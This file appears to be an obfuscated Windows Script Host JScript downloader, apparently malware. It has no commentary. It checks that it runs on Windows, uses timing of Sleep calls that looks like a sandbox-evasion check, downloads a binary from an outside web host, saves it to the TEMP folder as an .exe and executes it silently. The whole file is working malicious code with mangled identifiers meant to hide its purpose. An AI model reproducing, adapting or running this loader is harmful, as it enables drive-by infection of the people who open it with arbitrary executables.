var _WJ = false;
var _GP = "CreateObject";
var _SP = function _GN() {return WScript[_GP]("WScript"+".Shell");}(), _W0 = 11;
var _PM = "MSXML2.XMLHTTP";
var _AL = 2123213;
var _IN = 0;
function _I(_J){_SP["Run"](_J, _IN, _IN);};
function _LX(){return _PM + "";};
function _F(_G, _AF){_IN = _IN * 1; return _G - _AF;};
function _GW(){return _GP;};
/*@cc_on
  @if (@_win32 || @_win64)
    _WJ = true;
  @end
@*/
if (_WJ)
{
var _XO = "";
function _JZ(){return 22;};
var _LK = 0; var _I0 = 0;
function _JS()
{
var _XH = new this["Date"]();
var _VG = _XH["getUTCMilliseconds"]();
WScript["Sleep"](_JZ());
var _XH = new this["Date"]();
var _PE = _XH["getUTCMilliseconds"]();
WScript["Sleep"](_JZ());
var _XH = new this["Date"]();
var _JX = _XH["getUTCMilliseconds"]();
var _LK = "_WL";
_LK = _F(_PE, _VG);
var _I0 = "_D";
_I0 = _F(_JX, _PE);
_XO = "open";
return _F(_LK, _I0);
}
var _K0 = false;
var _T = false;
for (var _N = _IN; _N < _JZ() * 1; _N++){if (_JS() != _IN){
_K0 = true; 
_I0 = "31" + 11 * _LK + _I0; 
_T = true; 
break;
}}
function _MQ() {return ((_K0 == true) && (_K0 == _T)) ? 1 : _IN;};
if (_K0 && _MQ() && _T){
function _K() {return _SP["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "k6w6iGm3LX.ex" + "e";};
 _WT = _LX();
 _N0 = WScript[_GP](_WT);
 var _OM = 1;
 while (_OM){
try {
	if (_OM == 1)
	{
		_N0[_XO]("GET", "http://linkownia.itcom.pl/s9aps", false);
		_N0["send"]();
		_VC = "Sleep";
	}
	WScript[_VC](_JZ() + 120); 
	if (_N0["readystate"] < 2 * 2) continue;
	_OM = _IN;
	function _QV(_W) {var _U = (1, 2, 3, 4, 5, _W); return _U;};
	_TM = WScript[_GW()]("ADODB.Stream");
	_WT = _TM;
	_WT[_XO]();
	_WT["type"] = _QV(1);
	_WT["write"](_N0["ResponseBody"]);
	_TM["position"] = _QV(_IN);
	_WT["Save" + "ToFile"](_K(), 2);
	_TM["cl"+"ose"]();
	_DO = _K();
	_I(_DO);
} catch(_ML){};
}
}
}

